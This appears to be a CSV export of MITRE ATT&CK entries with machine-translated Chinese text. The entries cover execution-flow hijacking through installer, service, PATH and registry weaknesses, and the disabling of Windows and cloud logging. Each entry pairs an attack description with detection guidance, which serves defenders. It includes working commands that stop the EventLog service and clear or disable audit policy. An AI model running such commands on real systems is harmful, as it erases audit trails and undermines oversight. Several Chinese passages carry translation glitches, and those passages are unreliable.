T1574.005,Hijack Execution Flow: Executable Installer File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",https://attack.mitre.org/techniques/T1574/005,13 March 2020,26 March 2020,1.0,"Defense Evasion, Persistence, Privilege Escalation","Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.",Windows,"File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Service: Service Metadata",True,T1574,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, User",,,,,"Administrator, SYSTEM, User",",(Citation: Powersploit),(Citation: Executable Installers are Vulnerable)",劫持执行流程：可执行安装程序文件权限弱点,攻击者可以通过劫持安装程序使用的二进制文件来执行他们自己的恶意负载。这些进程可能会自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果包含目标二进制文件的文件系统目录的权限或二进制文件本身的权限设置不正确，则目标二进制文件可能会被另一个使用用户级权限的二进制文件覆盖并由原始进程执行。如果原始进程和线程在更高的权限级别下运行，那么被替换的二进制文件也将在更高级别的权限下执行，其中可能包括 SYSTEM。该技术的另一种变体可以通过利用可执行的自解压安装程序中常见的弱点来执行。在安装过程中，安装程序通常使用 <code>%TEMP%</code> 目录中的子目录来解压缩二进制文件，例如 DLL、EXE 或其他有效负载。当安装程序创建子目录和文件时，他们通常不会设置适当的权限来限制写访问，这允许执行放置在子目录中的不受信任的代码或覆盖安装过程中使用的二进制文件。此行为与 [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001) 有关并可能利用它。攻击者可能会使用此技术将合法二进制文件替换为恶意二进制文件，作为在更高权限级别执行代码的一种手段。一些安装程序可能还需要提升的权限，这将在执行对手控制的代码时导致权限升级。此行为与【绕过用户帐户控制】（https://attack.mitre.org/techniques/T1548/002）有关。已经向软件供应商报告了现有常见安装程序中这种弱点的几个示例。（引用：mozilla_sec_adv_2012）（引用：可执行安装程序是易受攻击的）如果执行进程设置为在特定时间或特定事件期间运行（例如，系统bootup) 那么这种技术也可以用于持久化。
T1574.013,Hijack Execution Flow: KernelCallbackTable,"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)

An adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.

A pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)

The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",https://attack.mitre.org/techniques/T1574/013,25 February 2022,22 March 2022,1.0,"Defense Evasion, Persistence, Privilege Escalation","Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious behaviors that could relate to post-compromise behavior.

Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>WriteProcessMemory()</code> and <code>NtQueryInformationProcess()</code> with the parameter set to <code>ProcessBasicInformation</code> may be used for this technique.(Citation: Lazarus APT January 2022)",Windows,Process: OS API Execution,True,T1574,,,,,,,,,"(Citation: FinFisher exposed ),(Citation: Lazarus APT January 2022),(Citation: Qualys LolZarus),",劫持执行流程：KernelCallbackTable,攻击者可能会滥用进程的 <code>KernelCallbackTable</code> 来劫持其执行流程以运行自己的有效负载。（引用：Lazarus APT 2022 年 1 月）（引用：FinFisher 暴露）<code>KernelCallbackTable</code > 可以在进程环境块 (PEB) 中找到，并在加载 <code>user32.dll</code> 后初始化为 GUI 进程可用的图形函数数组。（引用：Windows 进程注入 KernelCallbackTable）对手可能会使用 <code>KernelCallbackTable</code> 通过将原始回调函数替换为恶意负载来劫持进程的执行流程。修改回调函数可以通过各种涉及相关行为的方式实现，例如【反射代码加载】（https://attack.mitre.org/techniques/T1620）或【进程注入】（https://attack.mitre.org/技术/T1055) 进入另一个过程。 <code>KernelCallbackTable</code>的内存地址的指针可以通过定位PEB获得（例如：通过调用<code>NtQueryInformationProcess()</code> [Native API](https:// attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) 一旦找到指针，<code>KernelCallbackTable</code> 可以被复制，并且表中的一个函数（例如，<code>fnCOPYDATA </code>）设置为恶意负载的地址（例如：通过 <code>WriteProcessMemory()</code>）。然后用表的新地址更新 PEB。一旦调用了被篡改的函数，就会触发恶意负载。（引用：Lazarus APT 2022 年 1 月）通常使用 Windows 消息调用被篡改的函数。在进程被劫持并执行恶意代码后，<code>KernelCallbackTable</code> 也可能被其余的恶意负载恢复到其原始状态。（引用：Lazarus APT January 2022）<code> 的使用KernelCallbackTable</code> 劫持执行流程可能会逃避安全产品的检测，因为可以在合法进程下屏蔽执行。
T1574.007,Hijack Execution Flow: Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.

The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\system32</code> (e.g., <code>C:\Windows\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.

For example, if <code>C:\example path</code> precedes </code>C:\Windows\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\example path</code> will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",https://attack.mitre.org/techniques/T1574/007,13 March 2020,05 May 2022,1.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.

Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1574,Application Control,Stefan Kanthak,,,,"CAPEC-13, CAPEC-38",,,"(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Github PowerShell Empire),(Citation: Vulnerability and Exploit Detector),(Citation: SANS Application Whitelisting),(Citation: NSA MS AppLocker),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Microsoft Using Software Restriction ),(Citation: Microsoft Windows Defender Application Control),(Citation: Windows Commands JPCERT),(Citation: Microsoft Application Lockdown),(Citation: Microsoft CreateProcess)",劫持执行流程：PATH 环境变量的路径拦截,攻击者可以通过劫持用于加载库的环境变量来执行他们自己的恶意负载。攻击者可能会将程序放在 PATH 环境变量中存储的目录列表中的较早条目中，然后当 Windows 顺序搜索该 PATH 列表以搜索从脚本或命令行调用的二进制文件时，将执行该条目。 PATH 环境变量包含目录列表。某些执行程序的方法（即使用 cmd.exe 或命令行）仅依靠 PATH 环境变量来确定在未给出程序路径时搜索程序的位置。如果在 Windows 目录之前的 PATH 环境变量中列出了任何目录，<code>%SystemRoot%\system32</code>（例如，<code>C:\Windows\system32</code>），则可能会放置程序在上述与 Windows 程序（如 cmd、PowerShell 或 Python）同名的目录中，当从脚本或命令行执行该命令时将执行该程序。例如，如果 <code>C:\example path</code> 在 </code>C:\Windows\system32</code> 之前位于 PATH 环境变量中，则名为 net.exe 并放置在 <当从命令行执行“net”时，将调用 code>C:\example path</code> 而不是 Windows 系统“net”。
T1574.008,Hijack Execution Flow: Path Interception by Search Order Hijacking,"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument <code>net user</code>. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then <code>cmd.exe /C net user</code> will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)

Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).",https://attack.mitre.org/techniques/T1574/008,13 March 2020,17 September 2020,1.0,"Defense Evasion, Persistence, Privilege Escalation","Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.

Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
",Windows,"File: File Creation, File: File Modification, Process: Process Creation",True,T1574,,Stefan Kanthak,"Administrator, SYSTEM, User",,,CAPEC-159,,"Administrator, SYSTEM, User","(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Github PowerShell Empire),(Citation: Vulnerability and Exploit Detector),(Citation: SANS Application Whitelisting),(Citation: NSA MS AppLocker),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Microsoft Using Software Restriction ),(Citation: Microsoft Windows Defender Application Control),(Citation: Windows Commands JPCERT),(Citation: Microsoft Application Lockdown),(Citation: Microsoft CreateProcess)",劫持执行流程：通过搜索顺序劫持进行路径拦截,攻击者可以通过劫持用于加载其他程序的搜索顺序来执行他们自己的恶意负载。由于某些程序不使用完整路径调用其他程序，因此攻击者可能会将自己的文件放在调用程序所在的目录中，从而导致操作系统根据调用程序的请求启动其恶意软件。当攻击者滥用 Windows 搜索未指定路径的程序的顺序时，就会发生搜索顺序劫持。与 [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001) 不同，搜索顺序因执行程序的方法而异。 （引用：Microsoft CreateProcess）（引用：Windows NT Command Shell）（引用：Microsoft WinExec） 但是，Windows 通常在搜索 Windows 系统目录之前先搜索启动程序的目录。发现易受搜索顺序劫持的程序（即未指定可执行文件路径的程序）的对手可以通过创建以不正确指定的程序命名的程序并将其放置在启动程序的目录中来利用此漏洞.例如，“example.exe”使用命令行参数 <code>net user</code> 运行“cmd.exe”。攻击者可能会将名为“net.exe”的程序放置在与 example.exe 相同的目录中，将运行“net.exe”而不是 Windows 系统实用程序 net。此外，如果攻击者将名为“net.com”的程序与“net.exe”放在同一目录下，则 <code>cmd.exe /C net user</code> 将执行“net.com”而不是“net.exe”由于在 PATHEXT 下定义的可执行扩展的顺序。 （引用：Microsoft Environment Property）搜索顺序劫持也是劫持 DLL 负载的常见做法，在 [DLL 搜索顺序劫持](https://attack.mitre.org/techniques/T1574/001) 中有介绍。
T1574.009,Hijack Execution Flow: Path Interception by Unquoted Path,"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>""C:\safe path with space\program.exe""</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)

This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",https://attack.mitre.org/techniques/T1574/009,13 March 2020,18 October 2022,1.1,"Defense Evasion, Persistence, Privilege Escalation","Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.

Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",Windows,"File: File Creation, File: File Modification, Process: Process Creation",True,T1574,,Stefan Kanthak,,,,CAPEC-38,,,"(Citation: GitHub PowerSploit May 2012),(Citation: PowerSploit Documentation),(Citation: Github PowerShell Empire),(Citation: Vulnerability and Exploit Detector),(Citation: SANS Application Whitelisting),(Citation: NSA MS AppLocker),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Microsoft Using Software Restriction ),(Citation: Microsoft Windows Defender Application Control),(Citation: Windows Commands JPCERT),(Citation: Microsoft Application Lockdown),(Citation: Microsoft CreateProcess)",劫持执行流程：未引用路径的路径拦截,"攻击者可能通过劫持易受攻击的文件路径引用来执行自己的恶意负载。攻击者可以通过将可执行文件放置在路径内的更高级别目录中来利用缺少周围引用的路径，以便 Windows 将选择攻击者的可执行文件来启动。服务路径（引用：Microsoft CurrentControlSet 服务）和快捷路径也可能容易受到路径拦截，如果路径有一个或多个空格并且没有被引号包围（例如，<code>C:\unsafe path with space\program. exe</code> 与 <code>""C:\safe path with space\program.exe""</code>)。 （引用：帮助消除未引用的路径）（存储在 Windows 注册表项中）攻击者可以将可执行文件放在路径的更高级别目录中，Windows 将解析该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径是 <code>C:\program files\myapp.exe</code>，则攻击者可能会在 <code>C:\program.exe</code> 处创建一个程序，该程序将是运行而不是预期的程序。 （引用：Windows 未引用服务）（引用：Windows 特权升级指南）如果定期调用可执行文件，则此技术可用于持久性，如果截获的可执行文件由更高特权的进程启动，则可用于特权升级。"
T1574.010,Hijack Execution Flow: Services File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",https://attack.mitre.org/techniques/T1574/010,12 March 2020,16 September 2020,1.0,"Defense Evasion, Persistence, Privilege Escalation","Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. ",Windows,"File: File Creation, File: File Modification, Process: Process Creation, Service: Service Metadata",True,T1574,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, User",,,CAPEC-17,,"Administrator, SYSTEM, User","(Citation: F-Secure BlackEnergy 2014),(Citation: Powersploit),(Citation: Executable Installers are Vulnerable)",劫持执行流程：服务文件权限弱点,攻击者可以通过劫持服务使用的二进制文件来执行他们自己的恶意负载。攻击者可能会利用 Windows 服务权限中的缺陷来替换在服务启动时执行的二进制文件。这些服务进程可能会自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果包含目标二进制文件的文件系统目录的权限或二进制文件本身的权限设置不正确，则目标二进制文件可能会被另一个使用用户级权限的二进制文件覆盖并由原始进程执行。如果原始进程和线程在更高的权限级别下运行，那么被替换的二进制文件也将在更高级别的权限下执行，其中可能包括 SYSTEM。攻击者可能会使用此技术将合法二进制文件替换为恶意二进制文件，作为在更高权限级别执行代码的一种手段。如果执行进程被设置为在特定时间或在特定事件期间（例如，系统启动）运行，那么这种技术也可以用于持久性。
T1574.011,Hijack Execution Flow: Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)

Adversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>.(Citation: malware_hides_service)",https://attack.mitre.org/techniques/T1574/011,13 March 2020,05 May 2022,1.1,"Defense Evasion, Persistence, Privilege Escalation","Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.

Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.",Windows,"Command: Command Execution, Process: Process Creation, Service: Service Modification, Windows Registry: Windows Registry Key Modification",True,T1574,Application Control,"Matthew Demaske, Adaptforward; Travis Smith, Tripwire","Administrator, User",,,CAPEC-478,,SYSTEM,"(Citation: McAfee Honeybee),",劫持执行流程：服务注册表权限弱点,攻击者可以通过劫持服务使用的注册表条目来执行他们自己的恶意负载。攻击者可能会利用与服务相关的注册表项的权限缺陷，从最初指定的可执行文件重定向到他们控制的可执行文件，以便在服务启动时启动他们自己的代码。 Windows 将本地服务配置信息存储在 <code>HKLM\SYSTEM\CurrentControlSet\Services</code> 下的注册表中。通过服务控制器、sc.exe、[PowerShell](https://attack.mitre.org/techniques/T1059/001)等工具，可以操纵存储在服务注册表项下的信息来修改服务的执行参数，或 [注册](https://attack.mitre.org/software/S0075)。通过访问控制列表和用户权限控制对注册表项的访问。 （引用：注册表项安全性）（引用：malware_hides_service）如果未正确设置用户和组的权限并允许访问服务的注册表项，攻击者可能会更改服务的 binPath/ImagePath 以指向其下的不同可执行文件控制。当服务启动或重新启动时，攻击者控制的程序将执行，允许攻击者建立持久性和/或权限升级到服务设置为在其下执行的帐户上下文（本地/域帐户、SYSTEM、LocalService 或网络服务）。攻击者还可能更改服务注册表树中的其他注册表项。例如，可以更改 <code>FailureCommand</code> 键，以便在服务失败或故意损坏时在提升的上下文中执行服务。（引文：堪萨斯服务相关收集器）（引文：Tweet Registry Perms Weakness ) <code>Performance</code> 键包含驱动程序服务的性能 DLL 的名称和 DLL 中几个导出函数的名称。（引用：microsoft_services_registry_tree）如果 <code>Performance</code> 键还没有如果攻击者控制的用户拥有 <code>Create Subkey</code> 权限，攻击者可能会在服务的注册表树中创建 <code>Performance</code> 键以指向恶意 DLL。（引用：insecure_reg_perms ) 攻击者还可以添加 <code>Parameters</code> 键，该键存储驱动程序特定的数据，或其他自定义子键以供其恶意服务建立持久性或启用其他恶意活动。（引用：microsoft_services_registry_tree）（引用： troj_zegost) 此外，如果攻击者使用 svchost.exe 启动他们的恶意服务，则可以使用 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code> 来识别服务的文件。（引用：malware_hides_service）
T1562,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",https://attack.mitre.org/techniques/T1562,21 February 2020,19 October 2022,1.3,Defense Evasion,"Monitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.

Monitor environment variables and APIs that can be leveraged to disable security measures.","Containers, IaaS, Linux, Network, Office 365, Windows, macOS","Cloud Service: Cloud Service Disable, Cloud Service: Cloud Service Modification, Command: Command Execution, Driver: Driver Load, Firewall: Firewall Disable, Firewall: Firewall Rule Modification, Process: Process Creation, Process: Process Termination, Script: Script Execution, Sensor Health: Host Status, Service: Service Metadata, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification",False,,"Anti-virus, Digital Certificate Validation, File monitoring, Firewall, Host forensic analysis, Host intrusion prevention systems, Log analysis, Signature-based detection",,,,,,,,"(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Symantec W.32 Stuxnet Dossier),",削弱防御/破环防御,攻击者可能恶意修改受害者环境的组件，以阻碍或禁用防御机制。这不仅涉及削弱防火墙和防病毒等预防性防御，还涉及防御者可用于审计活动和识别恶意行为的检测功能。这也可能涵盖本机防御以及用户和管理员安装的补充功能。攻击者还可以针对事件聚合和分析机制，或者通过更改其他系统组件来破坏这些过程。
T1562.008,Impair Defenses: Disable Cloud Logs,"An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. 

Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities. For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic)",https://attack.mitre.org/techniques/T1562/008,12 October 2020,08 March 2022,1.2,Defense Evasion,"Monitor logs for API calls to disable logging. In AWS, monitor for: <code>StopLogging</code> and <code>DeleteTrail</code>.(Citation: Stopping CloudTrail from Sending Events to CloudWatch Logs) In GCP, monitor for: <code>google.logging.v2.ConfigServiceV2.UpdateSink</code>.(Citation: Configuring Data Access audit logs)  In Azure, monitor for <code>az monitor diagnostic-settings delete</code>.(Citation: az monitor diagnostic-settings) Additionally, a sudden loss of a log source may indicate that it has been disabled.",IaaS,"Cloud Service: Cloud Service Disable, Cloud Service: Cloud Service Modification",True,T1562,,"Alex Soler, AttackIQ; Ibrahim Ali Khan; Janantha Marasinghe; Matt Snyder, VMware; Prasad Somasamudram, McAfee; Sekhar Sarukkai, McAfee; Syed Ummar Farooqh, McAfee",User,,,,,,",",削弱防御/破环防御：禁用云日志,攻击者可能会禁用云日志记录功能和集成，以限制在其活动中收集哪些数据并避免被发现。云环境允许收集和分析审计和应用程序日志，从而深入了解用户在环境中所做的活动。如果对手有足够的权限，他们可以禁用日志记录以避免检测到他们的活动。例如，在 AWS 中，攻击者可能会在进行进一步的恶意活动之前禁用 CloudWatch/CloudTrail 集成。（引用：遵循 CloudTrail：使用 Sumo Logic 生成强大的 AWS 安全信号）
T1562.002,Impair Defenses: Disable Windows Event Logging,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.

The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\Local Policies\Audit Policy</code> for basic audit policy settings or <code>Security Settings\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)

Adversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: <code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)

By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",https://attack.mitre.org/techniques/T1562/002,21 February 2020,19 October 2021,1.1,Defense Evasion,"Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  

In Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.

